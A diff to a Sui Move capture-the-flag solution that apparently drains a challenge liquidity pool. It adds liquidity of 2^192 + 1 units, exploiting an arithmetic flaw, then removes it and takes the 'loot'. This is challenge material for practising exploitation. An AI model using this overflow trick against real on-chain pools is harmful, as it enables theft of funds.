@@ -1,14 +1,12 @@
 module solution::solve;
 
 use off_by_2_192::pool::{Self, Pool};
-use sui::coin;
 use sui::sui::SUI;
 
-public fun solve(pool: &mut Pool, ctx: &mut TxContext) {
-    let lp_amount: u256 = 1u256 << 192;
-    let mut payment = coin::zero<SUI>(ctx);
-    let lp = pool::add_liquidity(pool, lp_amount, &mut payment, ctx);
-    coin::destroy_zero(payment);
+public fun solve(pool: &mut Pool, mut payment: sui::coin::Coin<SUI>, ctx: &mut TxContext) {
+    let lp = pool::add_liquidity(pool, (1u256 << 192) + 1, &mut payment, ctx);
     let loot = pool::remove_liquidity(pool, lp, ctx);
-    transfer::public_transfer(loot, ctx.sender());
+    let sender = ctx.sender();
+    transfer::public_transfer(loot, sender);
+    transfer::public_transfer(payment, sender);
 }
